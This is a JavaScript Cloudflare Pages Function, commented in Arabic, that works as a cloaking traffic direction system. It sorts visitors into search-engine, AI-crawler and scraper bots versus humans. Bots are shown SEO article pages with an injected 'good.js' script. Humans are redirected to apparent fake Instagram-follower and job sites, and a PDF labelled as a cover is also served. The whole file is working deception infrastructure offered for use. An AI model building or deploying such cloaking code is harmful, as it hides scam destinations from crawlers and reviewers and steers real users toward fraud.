// Cloudflare Pages Functions — /api/input
//
// هذا الملف يُحوّل Next.js API route إلى Cloudflare Pages Function.
// يعمل على V8 isolates (Edge runtime) — لا يستخدم fs/path/process.cwd.
// يقرأ المقالات من static assets (env.ASSETS) بدلاً من fs.readFile.
//
// المزايا:
// - Cold start ≈ 0ms
// - يعمل في 330+ PoP عالميًا
// - يدعم multi-level subdomains SSL مجانًا
// - متكامل مع Cloudflare WAF + Bot Management

const DEFAULT_REDIRECTS = [
  { articleId: '4560', targetUrl: 'articles/1997.html', note: 'human -> 1997, bot -> 4560' },
  { articleId: '456', targetUrl: 'articles/1997.html', note: 'human -> 1997.html, bot -> 456.html' },
  { articleId: '2002037', targetUrl: 'https://instagram-followerss.vercel.app', note: 'IG followers' },
  { articleId: '120140', targetUrl: 'https://instagram-followerss.vercel.app/', note: 'IG followers' },
  { articleId: '8900', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '567', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '234', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '901', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '678', targetUrl: 'https://jobss-two.vercel.app/', note: 'jobs' },
  { articleId: '4563', targetUrl: 'https://us72.site/', note: 'jobs (article 4563.html exists for bot SEO)' },
]

const CORS_HEADERS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Range',
  'Cache-Control': 'no-store',
}

const VERIFIED_BOTS = [
  'googlebot', 'googlebot-image', 'googlebot-news', 'googlebot-video',
  'mediapartners-google', 'adsbot-google', 'bingbot', 'bingpreview',
  'slurp', 'duckduckbot', 'baiduspider', 'yandexbot',
  'facebookexternalhit', 'twitterbot', 'linkedinbot', 'applebot', 'pinterestbot',
]

const AI_BOTS = [
  'gptbot', 'chatgpt-user', 'oai-searchbot', 'claudebot', 'claude-web',
  'anthropic-ai', 'perplexitybot', 'perplexity-user', 'ccbot', 'google-extended',
  'meta-externalagent', 'meta-externalfetcher', 'diffbot', 'cohere-ai', 'ai2bot',
  'imagesiftbot', 'applebot-extended', 'amazonbot',
]

const BAD_BOTS = [
  'semrushbot', 'ahrefsbot', 'mj12bot', 'dotbot', 'petalbot', 'bytespider',
  'researchscan', 'awariorssbot', 'youbot', 'piplbot', 'zoominfobot', 'aihitbot',
]

/**
 * كشف البوت — يستخدم Cloudflare cf-* headers + UA fallback.
 */
function classifyVisitor(request) {
  const ua = (request.headers.get('user-agent') || '').toLowerCase()
  const cf = request.cf || {}
  const cookie = request.headers.get('cookie') || ''
  const reasons = []

  // 1. Verified bot (Googlebot)
  for (const b of VERIFIED_BOTS) {
    if (ua.includes(b)) {
      return { type: 'verified-bot', confidence: 'high', botScore: 95, reasons: [`UA:${b}`] }
    }
  }
  // 2. Bad bot
  for (const b of BAD_BOTS) {
    if (ua.includes(b)) {
      return { type: 'suspected-bot', confidence: 'high', botScore: 90, reasons: [`UA:${b}`] }
    }
  }
  // 3. AI bot
  for (const b of AI_BOTS) {
    if (ua.includes(b)) {
      return { type: 'suspected-bot', confidence: 'medium', botScore: 70, reasons: [`UA:${b}`] }
    }
  }

  // 4. cf.botManagement (Cloudflare Bot Management)
  const bmScore = cf.botManagement?.score
  if (typeof bmScore === 'number') {
    if (bmScore > 30) {
      return { type: 'suspected-bot', confidence: 'high', botScore: 80, reasons: [`botManagement.score:${bmScore}`] }
    }
    if (bmScore < 5) {
      return { type: 'human', confidence: 'high', botScore: 5, reasons: [`botManagement.score:${bmScore}`] }
    }
  }

  // 5. cf-bm header (Bot Fight Mode)
  const cfBm = request.headers.get('cf-bm')
  if (cfBm === 'true') {
    return { type: 'human', confidence: 'high', botScore: 5, reasons: ['cf-bm:true'] }
  }
  if (cfBm === 'false') {
    return { type: 'suspected-bot', confidence: 'medium', botScore: 60, reasons: ['cf-bm:false'] }
  }

  // 6. __cf_bm cookie
  if (cookie.includes('__cf_bm')) {
    return { type: 'human', confidence: 'high', botScore: 10, reasons: ['__cf_bm cookie'] }
  }

  // 7. Script UA
  if (ua.includes('python') || ua.includes('curl') || ua.includes('wget') || ua.includes('scrapy')) {
    return { type: 'suspected-bot', confidence: 'high', botScore: 85, reasons: [`script UA`] }
  }
  if (ua.includes('headless')) {
    return { type: 'suspected-bot', confidence: 'high', botScore: 95, reasons: ['headless'] }
  }

  // 8. cf-threat-score
  const threatScore = parseInt(request.headers.get('cf-threat-score') || '0', 10)
  if (!isNaN(threatScore) && threatScore > 30) {
    return { type: 'suspected-bot', confidence: 'medium', botScore: 70, reasons: [`threat:${threatScore}`] }
  }

  // 9. fallback: human
  return { type: 'human', confidence: 'low', botScore: 30, reasons: ['default human'] }
}

/**
 * يقرأ مقال HTML من static assets (env.ASSETS).
 */
async function readArticleHtml(env, articleId) {
  if (!/^[a-zA-Z0-9_-]+$/.test(articleId)) return null
  try {
    const response = await env.ASSETS.fetch(`https://assets.local/articles/${articleId}.html`)
    if (response.ok) {
      return await response.text()
    }
  } catch (e) {
    console.warn('readArticleHtml error:', e.message)
  }
  return null
}

/**
 * يخدم مقال مع حقن good.js.
 */
async function serveArticleWithGoodJs(env, articleId, host) {
  const html = await readArticleHtml(env, articleId)
  if (!html) {
    return new Response(`Article "${articleId}" not found`, {
      status: 404,
      headers: CORS_HEADERS,
    })
  }
  const tdsDomain = `https://${host}`
  const goodJsTag = `<script src="${tdsDomain}/server/good.js"></script>`
  const modifiedHtml = html.includes('</body>')
    ? html.replace('</body>', `${goodJsTag}\n</body>`)
    : html + goodJsTag

  return new Response(modifiedHtml, {
    status: 200,
    headers: { 'Content-Type': 'text/html; charset=utf-8', ...CORS_HEADERS },
  })
}

/**
 * يخدم PDF الغطاء من static assets.
 */
async function servePdf(env) {
  try {
    const response = await env.ASSETS.fetch('https://assets.local/pdfviewer/api.pdf')
    if (response.ok) {
      const buffer = await response.arrayBuffer()
      return new Response(buffer, {
        status: 200,
        headers: {
          'Content-Type': 'application/pdf',
          'Content-Disposition': 'inline',
          ...CORS_HEADERS,
        },
      })
    }
  } catch (e) {
    console.warn('servePdf error:', e.message)
  }
  return new Response('PDF not found', { status: 404, headers: CORS_HEADERS })
}

/**
 * يرجع أول قيمة معامل ذات معنى.
 */
function pickArticleIdFromParams(params) {
  const known = ['ids', 'io0', 'id', 'articleId']
  for (const key of known) {
    const v = params.get(key)?.trim()
    if (v) return v
  }
  for (const [key, value] of params.entries()) {
    const v = value?.trim()
    if (!v || key === '_from_viewer') continue
    return v
  }
  return null
}

/**
 * Pages Function الرئيسي.
 */
export async function onRequestGet(context) {
  const { request, env } = context
  const url = new URL(request.url)
  const params = url.searchParams
  const host = request.headers.get('host') || request.headers.get('x-forwarded-host') || 'trackpoint.sbs'

  const verdict = classifyVisitor(request)
  const bot = verdict.type === 'verified-bot' || verdict.type === 'suspected-bot'

  if (bot) {
    console.log(`[input] bot via ${verdict.type} (score=${verdict.botScore}) ${verdict.reasons.join('|')}`)
  }

  const articleId = pickArticleIdFromParams(params)

  // 0. عارض PDF بدون معرف
  if (params.get('_from_viewer') === 'true' && !articleId) {
    return servePdf(env)
  }

  // 1. قواعد التوجيه
  if (articleId) {
    const rule = DEFAULT_REDIRECTS.find((r) => r.articleId === articleId)
    if (rule) {
      if (bot) {
        return serveArticleWithGoodJs(env, rule.articleId, host)
      }
      const target = rule.targetUrl
      if (target.startsWith('articles/') || target.endsWith('.html')) {
        const targetArticleId = target.replace(/^articles\//, '').replace(/\.html$/, '')
        return serveArticleWithGoodJs(env, targetArticleId, host)
      }
      // JSON redirect للإنسان
      return new Response(
        JSON.stringify({ redirectUrl: target, redirect: target }),
        {
          status: 200,
          headers: { 'Content-Type': 'application/json; charset=utf-8', ...CORS_HEADERS },
        }
      )
    }
  }

  // 2. لا قاعدة — فحص وجود ملف
  if (articleId) {
    const html = await readArticleHtml(env, articleId)
    if (html) {
      return serveArticleWithGoodJs(env, articleId, host)
    }
  }

  // 3. عارض PDF fallback
  if (params.get('_from_viewer') === 'true') {
    return servePdf(env)
  }

  // 4. fallback إلى 1997.html
  if (articleId) {
    return serveArticleWithGoodJs(env, '1997', host)
  }

  return new Response('Invalid or missing parameters', {
    status: 400,
    headers: CORS_HEADERS,
  })
}

export async function onRequestPost(context) {
  return onRequestGet(context)
}

export async function onRequestOptions() {
  return new Response(null, { status: 204, headers: CORS_HEADERS })
}
